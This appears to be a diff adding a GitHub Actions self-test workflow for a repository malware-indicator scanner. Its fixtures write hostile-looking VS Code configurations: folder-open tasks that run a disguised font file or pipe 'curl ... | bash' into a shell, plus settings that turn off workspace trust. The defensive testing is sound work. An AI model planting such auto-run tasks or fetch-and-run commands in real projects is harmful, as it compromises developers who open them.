@@ -1,0 +1,188 @@
+# Fixture tests for scripts/tree-ioc-scan.sh.
+#
+# WHY THIS EXISTS
+#   The org ruleset ("require workflows to pass") runs pr-security.yml from
+#   THIS repo's default branch, against the pull request's content. That is the
+#   right behaviour for a central gate -- a PR must not be able to weaken the
+#   gate that is judging it -- but it has a consequence that is easy to miss:
+#
+#     A pull request that changes the guard CANNOT exercise its own change.
+#     The ruleset keeps running main's definition, so the guard job reports
+#     green while the new detection logic never executes. Verified in practice:
+#     a PR renaming the guard job still produced a check with the OLD job name.
+#
+#   Merging an untested change into a gate that is required on every repo in the
+#   org is not acceptable, so correctness is proven HERE instead. This workflow
+#   is repo-local and triggered by `pull_request`, so it runs from the PR head
+#   and does execute the code under review.
+#
+# WHAT IT ASSERTS
+#   Detection AND non-detection. A scanner that blocks everything is as useless
+#   as one that blocks nothing -- and far more likely to be switched off, since
+#   the pressure to disable a gate that fails valid work is enormous. So the
+#   false-positive cases are as load-bearing as the true-positive ones.
+#
+# Fixtures are generated at runtime, never committed: a committed fixture
+# containing real IOC strings would be flagged by the guard itself on every
+# subsequent PR.
+name: Scanner self-test
+
+on:
+  pull_request:
+    paths:
+      - 'scripts/tree-ioc-scan.sh'
+      - '.github/workflows/scanner-selftest.yml'
+      - '.github/workflows/shai-hulud-guard.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  fixtures:
+    name: Fixture tests
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262  # v4
+        with:
+          persist-credentials: false
+
+      - name: Run fixture matrix
+        shell: bash
+        run: |
+          # GitHub invokes run: blocks as `bash -e -o pipefail`. Every case here
+          # deliberately captures a NON-ZERO exit code from the scanner, so with
+          # errexit on, the first must-block case kills the whole step before it
+          # can print anything. Disable it explicitly; failures are counted and
+          # exited on at the end instead. (Found by this workflow's first CI run,
+          # which passed locally because a plain `bash script.sh` has no -e.)
+          set +e
+          set -uo pipefail
+          S="$PWD/scripts/tree-ioc-scan.sh"
+          [ -r "$S" ] || { echo "::error::scanner not found at $S"; exit 1; }
+          pass=0; fail=0
+
+          # Each case builds a throwaway git repo, runs the scanner, and compares
+          # the exit code against what that case must produce.
+          #   0 = clean · 1 = confirmed indicator · 3 = internal error
+          check() {
+            local name="$1" want="$2"; shift 2
+            local d; d="$(mktemp -d)"
+            ( cd "$d" && git init -q . \
+              && git config user.email t@example.com && git config user.name t \
+              && eval "$@" \
+              && git add -A >/dev/null && git commit -qm fixture ) >/dev/null 2>&1
+            local got; ( cd "$d" && bash "$S" . >/dev/null 2>&1 ); got=$?
+            if [ "$got" = "$want" ]; then
+              printf '  ✅ %-46s exit=%s\n' "$name" "$got"; pass=$((pass+1))
+            else
+              printf '  ❌ %-46s exit=%s (expected %s)\n' "$name" "$got" "$want"; fail=$((fail+1))
+              ( cd "$d" && bash "$S" . 2>&1 | sed 's/^/       /' | head -20 )
+            fi
+            rm -rf "$d"
+          }
+
+          echo "── MUST BLOCK ──────────────────────────────────────────────"
+
+          # Script wearing a font extension, launched by a folder-open task.
+          check "auto-run task executing an asset file" 1 '
+            mkdir -p .vscode public/fonts
+            printf "%s" "{\"tasks\":[{\"command\":\"node ./public/fonts/x.woff2\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]}" > .vscode/tasks.json
+            printf "var a=1;\n" > public/fonts/x.woff2'
+
+          # Folder-open task piping a fetched script into a shell.
+          check "auto-run task piping curl into a shell" 1 '
+            mkdir -p .vscode
+            printf "%s" "{\"tasks\":[{\"command\":\"curl https://example.invalid/s | bash\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]}" > .vscode/tasks.json'
+
+          # Committed auto-run pre-approval: removes the prompt for every reader.
+          check "committed task.allowAutomaticTasks" 1 '
+            mkdir -p .vscode
+            printf "%s" "{\"task.allowAutomaticTasks\":true}" > .vscode/settings.json'
+
+          # Committed workspace-trust bypass.
+          check "committed workspace trust disabled" 1 '
+            mkdir -p .vscode
+            printf "%s" "{\"security.workspace.trust.enabled\":false}" > .vscode/settings.json'
+
+          # Text file claiming to be a PNG.
+          check "text file with a .png extension" 1 '
+            mkdir -p img && printf "function f(){return process.env.X}\n" > img/logo.png'
+
+          echo
+          echo "── MUST PASS (false-positive guards) ───────────────────────"
+
+          # Genuine binaries whose magic bytes match their extension.
+          check "valid PNG / JPEG / WOFF2 assets" 0 '
+            mkdir -p img
+            printf "\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR" > img/a.png
+            printf "\xff\xd8\xff\xe0\x00\x10JFIF" > img/b.jpg
+            printf "wOF2\x00\x01\x00\x00\x00\x00" > img/c.woff2'
+
+          # A folder-open task is allowed when what it runs is local and not an
+          # asset file. Blocking this would break legitimate repos.
+          check "folderOpen task running npm (warn, not block)" 0 '
+            mkdir -p .vscode
+            printf "%s" "{\"tasks\":[{\"label\":\"b\",\"command\":\"npm run build\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]}" > .vscode/tasks.json'
+
+          # Ordinary editor preferences must not trip the settings.json checks.
+          check "benign .vscode/settings.json" 0 '
+            mkdir -p .vscode && printf "%s" "{\"editor.tabSize\":2}" > .vscode/settings.json'
+
+          # Documentation legitimately quotes install one-liners.
+          check "docs quoting a curl|bash install line" 0 '
+            mkdir -p docs && printf "Run: curl https://example.invalid/i | bash\n" > docs/i.md'
+
+          # The scanner must not flag itself: its pattern list is a file full of
+          # IOC strings, and this repo is scanned by this very gate.
+          check "repo containing the scanner itself" 0 "
+            mkdir -p scripts && cp '$S' scripts/"
+
+          check "empty repository" 0 'printf "x\n" > README.md'
+
+          echo
+          echo "── SECURITY PROPERTY ───────────────────────────────────────"
+
+          # An in-tree .security-allowlist must NOT be honoured. The workflow
+          # resolves the allowlist from the BASE commit and passes it with
+          # --allowlist; the script never auto-loads one from the working tree.
+          # If it did, a PR could add a finding AND its own suppression in the
+          # same change -- the self-approval bypass already closed here for
+          # osv-scanner.toml and .gitleaks.toml. This case locks that shut.
+          #
+          # Note this asserts exit 1 WITH the allowlist file present: the finding
+          # must survive. The dedicated step below proves the flag itself works.
+          check "in-tree allowlist is NOT auto-honoured" 1 '
+            mkdir -p img
+            printf "version https://git-lfs.github.com/spec/v1\noid sha256:0\nsize 1\n" > img/big.png
+            printf "img/big.png\n" > .security-allowlist'
+
+          echo
+          echo "════════════════════════════════════════════════════════════"
+          echo " passed: $pass    failed: $fail"
+          if [ "$fail" -gt 0 ]; then
+            echo "::error::scanner self-test failed — do not merge"
+            exit 1
+          fi
+          echo "✅ all fixture tests passed"
+
+      # The allowlist path is only exercised above via a file in the tree. This
+      # asserts the flag itself works, since a broken --allowlist would leave
+      # repos with no way to suppress a false positive except disabling the gate.
+      - name: Assert --allowlist flag suppresses a finding
+        shell: bash
+        run: |
+          set +e            # same reason as above: non-zero exits are the data here
+          set -uo pipefail
+          d="$(mktemp -d)"; cd "$d"
+          git init -q .; git config user.email t@example.com; git config user.name t
+          mkdir -p img && printf 'function f(){}\n' > img/x.png
+          git add -A >/dev/null && git commit -qm f >/dev/null
+          ( bash "$GITHUB_WORKSPACE/scripts/tree-ioc-scan.sh" . >/dev/null 2>&1 ); before=$?
+          printf 'img/x.png\n' > "$d/allow.txt"
+          ( bash "$GITHUB_WORKSPACE/scripts/tree-ioc-scan.sh" --allowlist "$d/allow.txt" . >/dev/null 2>&1 ); after=$?
+          echo "  without allowlist: exit=$before (expect 1)"
+          echo "  with allowlist:    exit=$after (expect 0)"
+          [ "$before" = "1" ] && [ "$after" = "0" ] || { echo "::error::--allowlist is broken"; exit 1; }
+          echo "✅ allowlist suppression works"
